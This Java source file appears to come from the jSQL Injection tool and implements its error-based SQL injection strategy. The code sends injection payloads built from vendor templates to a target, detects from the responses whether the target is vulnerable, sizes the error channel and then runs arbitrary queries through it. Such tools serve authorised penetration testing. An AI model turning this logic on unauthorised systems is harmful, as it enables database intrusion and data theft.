package com.jsql.model.injection.strategy;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.log4j.Logger;

import com.jsql.model.MediatorModel;
import com.jsql.model.bean.util.Request;
import com.jsql.model.bean.util.TypeRequest;
import com.jsql.model.exception.StoppedByUserException;
import com.jsql.model.injection.vendor.VendorXml;
import com.jsql.model.injection.vendor.Model.Strategy.Error.Method;
import com.jsql.model.suspendable.AbstractSuspendable;

/**
 * Injection strategy using error attack.
 */
public class ErrorbasedStrategy extends AbstractStrategy {
	
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getRootLogger();

    @Override
    public void checkApplicability() {
        
        if (MediatorModel.model().vendor.instance().getXmlModel().getStrategy().getError() == null) {
            LOGGER.info("No Error based strategy known for "+ MediatorModel.model().vendor +".");
            return;
        } else {
            LOGGER.trace("Error based test...");
        }
        
        this.errorCapacity = new String[MediatorModel.model().vendor.instance().getXmlModel().getStrategy().getError().getMethod().size()];
        int indexErrorMethod = 0;
        int errorCapacity = 0;
        for (Method errorMethod: MediatorModel.model().vendor.instance().getXmlModel().getStrategy().getError().getMethod()) {
            LOGGER.trace("Testing "+ errorMethod.getName() +"...");
        
            String performanceSourcePage = MediatorModel.model().injectWithoutIndex(
                MediatorModel.model().getCharInsertion() + 
                " "+ VendorXml.replaceTags(
                    errorMethod.getQuery()
                    .replace("${WINDOW}", MediatorModel.model().vendor.instance().getXmlModel().getStrategy().getConfiguration().getSlidingWindow())
                    .replace("${INJECTION}", MediatorModel.model().vendor.instance().getXmlModel().getStrategy().getConfiguration().getFailsafe().replace("${INDICE}","0"))
                    .replace("${INDEX}", "1")
                    .replace("${CAPACITY}", ""+errorMethod.getCapacity())
                )
            );
    
            isApplicable = performanceSourcePage.matches(
                VendorXml.replaceTags(
                    "(?s).*"+ 
                    MediatorModel.model().vendor.instance().getXmlModel().getStrategy().getConfiguration().getFailsafe()
                    .replace("${INDICE}","0")
                    .replace("0%2b1", "1") +".*"
                )
            );
            
            if (this.isApplicable) {
                LOGGER.debug("Vulnerable to "+ errorMethod.getName());
                this.allow(indexErrorMethod);
                
                String performanceErrorBasedSourcePage = MediatorModel.model().injectWithoutIndex(
                    MediatorModel.model().getCharInsertion() + 
                    " "+ VendorXml.replaceTags(
                        errorMethod.getQuery()
                        .replace("${WINDOW}", MediatorModel.model().vendor.instance().getXmlModel().getStrategy().getConfiguration().getSlidingWindow())
                        .replace("${INJECTION}", MediatorModel.model().vendor.instance().getXmlModel().getStrategy().getConfiguration().getCalibrator())
                        .replace("${INDEX}", "1")
                        .replace("${CAPACITY}", (""+errorMethod.getCapacity()))
                    )
                );
                
                Matcher regexSearch = Pattern.compile("(?s)SQLi(#+)").matcher(performanceErrorBasedSourcePage);
                while (regexSearch.find()) {
                    if (errorCapacity < regexSearch.group(1).length()) {
                        errorIndex = indexErrorMethod;
                    }
                    errorCapacity = regexSearch.group(1).length();
                    this.errorCapacity[indexErrorMethod] = errorCapacity+"";
                }
            } else {
                this.unallow(indexErrorMethod);
            }
            
            indexErrorMethod++;
        }
    }

    @Override
    public void allow() {
        markVulnerable(TypeRequest.MARK_ERRORBASED_VULNERABLE);
    }

    @Override
    public void unallow() {
        markVulnerable(TypeRequest.MARK_ERRORBASED_INVULNERABLE);
    }

    @Override
    public void allow(int i) {
        markVulnerable(TypeRequest.MARK_ERRORBASED_VULNERABLE, i);
    }

    @Override
    public void unallow(int i) {
        markVulnerable(TypeRequest.MARK_ERRORBASED_INVULNERABLE, i);
    }

    @Override
    public String inject(String sqlQuery, String startPosition, /*TODO parametre inutile? */AbstractSuspendable<String> stoppable) throws StoppedByUserException {
        return MediatorModel.model().injectWithoutIndex(
            MediatorModel.model().getCharInsertion() +
            MediatorModel.model().vendor.instance().sqlErrorBased(sqlQuery, startPosition)
        );
    }

    @Override
    public void activateStrategy() {
        LOGGER.info("Using strategy ["+ this.getName() +"]");
        MediatorModel.model().setStrategy(Strategy.ERRORBASED);
        
        Request request = new Request();
        request.setMessage(TypeRequest.MARK_ERRORBASED_STRATEGY);
        MediatorModel.model().sendToViews(request);
    }
    
    @Override
    public String getPerformanceLength() {
        return errorCapacity[errorIndex] +"" ;
    }
    
    @Override
    public String getName() {
        return "Error based";
    }
    
    String[] errorCapacity;
    
    int errorIndex = 0;
    
    public Integer getErrorIndex() {
        return errorIndex;
    }
    public void setErrorIndex(int i) {
        errorIndex = i;
    }
    
}
